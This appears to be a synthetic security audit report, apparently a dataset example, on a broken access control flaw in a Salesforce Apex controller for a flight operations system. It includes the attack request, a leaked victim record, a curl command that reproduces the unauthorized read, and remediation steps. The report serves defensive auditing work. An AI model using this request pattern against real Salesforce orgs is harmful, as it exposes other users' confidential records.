# Security Analysis Report
**System:** AeroOps Flight Management (Salesforce-Integrated)
**Domain:** Aviation / Flight Ops
**Example ID:** SF-0087
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC — Pattern 2.1 | Functional pivot on `EventController.updateEvent` — attacker reads any flight ops Event record not belonging to their account |

---

## Finding 1 — BAC: Functional Pivot on Event Object (Pattern 2.1)

### Summary
The Apex controller `EventController` on AeroOps Flight Management (`312d9b87.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Event object. Per §5.0 Pattern 2.1, the controller provides a functional pivot allowing a lower-privileged user to read records they should not access, enabling both horizontal and vertical access violations.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getEventDetails(String eventId, ...)` while the Aura descriptor in §6.0 is `c.EventController.updateEvent`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 2.1 — Functional pivot (vertical/horizontal) (BAC)
**Affected controller:** `c.EventController.updateEvent`
**Affected endpoint:** `POST https://312d9b87.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://312d9b87.lightning.force.com/aura
Authorization: Bearer 00D312D9B87!AR312d9b87...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D312D9B87!AR312d9b87...

message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","callingDescriptor":"UNKNOWN",
"params":{"eventId":"0019B87","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Event Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0019B87", "Name": "Victim Event Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-20-7340"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D312D9B87!AR312d9b87..."
curl -s -X POST "https://312d9b87.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","callingDescriptor":"UNKNOWN","params":{"eventId":"0019B87","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-20-7340
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class EventController { ... }`
2. `WHERE Id = :eventId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
